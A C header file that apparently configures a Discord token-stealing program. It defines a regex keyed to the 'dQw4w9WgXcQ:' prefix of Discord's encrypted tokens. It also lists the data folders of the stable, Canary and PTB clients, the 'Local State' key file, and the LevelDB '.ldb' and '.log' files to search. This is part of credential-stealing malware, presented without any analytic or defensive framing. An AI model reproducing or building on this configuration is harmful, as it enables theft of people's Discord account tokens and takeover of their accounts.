#ifndef TRIXIE_CONFIG_H
#define TRIXIE_CONFIG_H

#include "starburst/starburst.h"

// #define REGEX_TOKEN "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*"
#define REGEX_TOKEN "(?<=dQw4w9WgXcQ:)[^.*\\['(.*)'\\].*$][^\\\"]{0,136}"

const char *roaming_paths[] = {
    "discord",
    "discordcanary",
    "discordptb",
};

const char *local_state_dir = "Local State";

const char *leveldb_suffixes[] = {
    ".ldb",
    ".log",
};

#endif // TRIXIE_CONFIG_H
